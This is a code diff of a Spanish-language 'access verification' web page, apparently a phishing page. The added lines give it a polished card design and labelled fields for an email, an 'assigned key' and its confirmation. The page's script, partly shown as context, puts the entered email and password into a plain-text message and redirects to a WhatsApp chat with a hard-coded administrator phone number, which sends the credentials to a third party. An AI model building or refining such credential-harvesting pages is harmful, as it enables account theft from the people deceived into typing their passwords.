@@ -3,18 +3,117 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificación de Acceso</title>
+  <title>Verificación de Acceso - Sala de Confrontación</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 12px;
+      padding: 30px 25px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .card h2 {
+      color: #111827;
+      margin-bottom: 8px;
+      font-size: 1.4rem;
+    }
+
+    .card p {
+      color: #6b7280;
+      font-size: 0.9rem;
+      margin-bottom: 24px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.85rem;
+      color: #374151;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-group input:focus {
+      border-color: #25d366;
+    }
+
+    .btn-submit {
+      width: 100%;
+      background-color: #25d366;
+      color: #ffffff;
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background-color 0.2s;
+    }
+
+    .btn-submit:hover {
+      background-color: #1da851;
+    }
+  </style>
 </head>
 <body>
 
-  <!-- AQUÍ PEGAS EL CÓDIGO DEL FORMULARIO Y SCRIPT -->
-  <form id="formularioVerificacion">
-    <input type="email" id="correo" placeholder="Correo electrónico" required />
-    <input type="password" id="clave" placeholder="Clave asignada" required />
-    <input type="password" id="confirmacionClave" placeholder="Confirmar clave" required />
-    
-    <button type="submit">Entrar al chat</button>
-  </form>
+  <div class="card">
+    <h2>Confirmación de Datos</h2>
+    <p>Ingresa tus credenciales para continuar al chat de verificación.</p>
+
+    <form id="formularioVerificacion">
+      <div class="form-group">
+        <label for="correo">Correo electrónico</label>
+        <input type="email" id="correo" placeholder="ejemplo@correo.com" required />
+      </div>
+
+      <div class="form-group">
+        <label for="clave">Clave asignada</label>
+        <input type="password" id="clave" placeholder="Ingresa tu clave" required />
+      </div>
+
+      <div class="form-group">
+        <label for="confirmacionClave">Confirmar clave</label>
+        <input type="password" id="confirmacionClave" placeholder="Confirma tu clave" required />
+      </div>
+
+      <button type="submit" class="btn-submit">Entrar al chat</button>
+    </form>
+  </div>
 
   <script>
     document.getElementById('formularioVerificacion').addEventListener('submit', function(e) {
@@ -29,10 +128,15 @@
         return;
       }
 
+      // Número del administrador en formato internacional sin espacios
       const numeroAdmin = "573241447817"; 
+
+      // Construcción del mensaje automático
       const textoMensaje = `Hola, yo soy ${correo}.\nMi clave es: ${clave}\nConfirmación de clave: ${confirmacionClave}\nQuedo activo aquí para la sala de confrontación.`;
+
       const mensajeCodificado = encodeURIComponent(textoMensaje);
 
+      // Redirección directa al chat de WhatsApp con el mensaje cargado
       window.location.href = `https://wa.me/${numeroAdmin}?text=${mensajeCodificado}`;
     });
   </script>
